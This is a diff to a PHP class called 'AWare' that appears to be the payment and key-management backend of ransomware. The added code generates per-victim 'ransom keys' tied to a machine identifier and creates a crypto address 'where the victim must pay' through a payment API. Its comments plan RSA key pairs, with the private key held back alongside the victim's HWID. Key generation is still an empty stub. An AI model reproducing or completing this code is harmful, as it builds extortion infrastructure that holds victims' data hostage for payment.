@@ -2,38 +2,78 @@
 
 class AWare
 {
-    private $DefaultCacheJsonFile = [];
+    private $CryptAPIObject;
 
     private $CachePath;
+    private $VictimKeysCache;
 
-    public function __construct($LogsCacheFile)
+    public function __construct($CryptAPIObject)
+    {
+        $this->CryptAPIObject = $CryptAPIObject;
+    }
+
+    public function DefineJsonCachePaths($LogsCacheFile, $LogsRansomVictimKeys)
     {
         $this->CachePath = $LogsCacheFile;
+        $this->VictimKeysCache = $LogsRansomVictimKeys;        
     }
 
-    public function GenerateVictimInvoice($GET)
+    public function GenerateVictimRansomKeys($PC_IDENTIFIER)
     {
-        $this->GenerateFileAndDirectoryInCaseDoesNotExist();
+        $this->GenerateFileAndDirectoryInCaseDoesNotExist($this->CachePath);
+        $this->GenerateFileAndDirectoryInCaseDoesNotExist($this->VictimKeysCache);
 
-        # Here create the order and save it on the cache until has been paid
+        # Here create the address where the victim must pay
+        $AddressIn = $this->CryptAPIObject->GenerateAddress('https://' . Domain . '/AWare_API.php');
+
+        /*
+            Here the public and private RSA keys will be created, 
+            the public key will be sent to the user and the private key 
+            will be stored in the cache together with the user's HWID and the address where the user must pay
+        */
     }
 
-    private function GenerateFileAndDirectoryInCaseDoesNotExist()
+    private function CreatePairEncryptionKeys()
     {
-        if (file_exists($this->CachePath))
+        
+    }
+
+    private function GenerateFileAndDirectoryInCaseDoesNotExist($File)
+    {
+        # If the file already exists
+        if (file_exists($File))
         {
+            # it returns
             return;
         }
 
-        if (!str_contains($this->CachePath, '/'))
+        # If the file does not contain the '/' sign
+        if (!str_contains($File, '/'))
         {
-            file_put_contents($this->CachePath, json_encode([], JSON_PRETTY_PRINT));
+            # A empty .json file is saved directly to the path
+            $this->CreateJsonFile($File, []);
             return;
         }
 
+        # If it is a directory, here it will do a split with the /
+        $PathSplitted = explode('/', $File);
 
-        $PathSplitted = explode('/', $this->CachePath);
+        # If the directory does not exist
+        if (!file_exists($PathSplitted[0]))
+        {
+            # The directory will be created
+            mkdir($PathSplitted[0], 0777, true);
+        }
 
+        # The new path will be saved (directory / name of the .json file)
+        $File = $PathSplitted[0] . '/' . $PathSplitted[1];
 
+        # The file will be created
+        $this->CreateJsonFile($File, []);
+    }
+
+    private function CreateJsonFile($Path, $Array)
+    {
+        file_put_contents($Path, json_encode($Array, JSON_PRETTY_PRINT));
     }
 }
